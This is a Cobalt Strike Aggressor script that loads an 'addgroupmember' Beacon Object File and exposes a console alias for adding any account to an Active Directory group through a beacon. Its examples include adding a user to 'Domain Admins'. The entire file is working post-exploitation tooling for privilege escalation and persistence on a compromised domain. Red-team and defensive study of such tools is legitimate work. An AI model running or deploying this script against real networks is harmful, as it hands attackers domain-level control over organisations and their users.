# addgroupmember.cna - Cobalt Strike Aggressor Script
#
# Loads the addgroupmember BOF and exposes the addgroupmember alias.
#
# Usage (from CS console):
#   addgroupmember <group> <member>
#   addgroupmember <group> <member> [searchOU] [dc] [ldaps]
#
# Examples:
#   addgroupmember "Domain Admins" jdoe
#   addgroupmember "CN=Domain Admins,CN=Users,DC=corp,DC=local" "CN=jdoe,CN=Users,DC=corp,DC=local" "" "" 0
#   addgroupmember "IT-Admins" jdoe "OU=Groups,DC=corp,DC=local" 192.168.1.10 1
#
# Argument mapping (bof_pack "zizizzi"):
#   z - group identifier
#   i - isGroupDN   (1 if arg starts with CN= or OU= or DC=)
#   z - member identifier
#   i - isMemberDN  (1 if arg starts with CN= or OU= or DC=)
#   z - search OU   (optional, empty = use defaultNamingContext)
#   z - DC address  (optional, empty = auto-discover)
#   i - useLdaps    (1 = LDAPS, 0 = plain LDAP)

# Helper: detect if an identifier looks like a full DN
sub is_dn {
    local('$val');
    $val = $1;
    if ($val ismatch "(?i)^(CN|OU|DC)=.*") {
        return 1;
    }
    return 0;
}

# Main alias
alias addgroupmember {
    local('$bid $barch $handle $data $args');
    local('$group $member $searchOU $dc $useLdaps');
    local('$isGroupDN $isMemberDN');

    $bid = $1;

    if (size(@_) < 3) {
        berror($bid, "Usage: addgroupmember <group> <member> [searchOU] [dc] [ldaps 0|1]");
        berror($bid, "  group    - sAMAccountName or full DN of the target group");
        berror($bid, "  member   - sAMAccountName or full DN of the object to add");
        berror($bid, "  searchOU - (optional) OU to scope the search, e.g. OU=Users,DC=corp,DC=local");
        berror($bid, "  dc       - (optional) DC IP/hostname, leave blank for auto-discovery");
        berror($bid, "  ldaps    - (optional) 1 = use LDAPS (636), 0 = LDAP (389, default)");
        return;
    }

    $group    = $2;
    $member   = $3;
    $searchOU = iff(size(@_) >= 4, $4, "");
    $dc       = iff(size(@_) >= 5, $5, "");
    $useLdaps = iff(size(@_) >= 6, int($6), 0);

    # Auto-detect DN vs sAMAccountName

    $isGroupDN  = is_dn($group);
    $isMemberDN = is_dn($member);

    # Pick the right .o for this beacon architecture
    $barch = barch($bid);
    if ($barch eq "x64") {
        $handle = openf(script_resource("addgroupmember.x64.o"));
    } else {
        $handle = openf(script_resource("addgroupmember.x86.o"));
    }
    $data = readb($handle, -1);
    closef($handle);

    if (strlen($data) == 0) {
        berror($bid, "[-] Could not read BOF object file. Did you run `make`?");
        return;
    }

    # Pack arguments - order matches go() argument parsing
    $args = bof_pack($bid, "zizizzi",
                     $group,    $isGroupDN,
                     $member,   $isMemberDN,
                     $searchOU,
                     $dc,
                     $useLdaps);

    btask($bid, "Executing addgroupmember BOF: adding " . $member . " to " . $group);
    beacon_inline_execute($bid, $data, "go", $args);
}
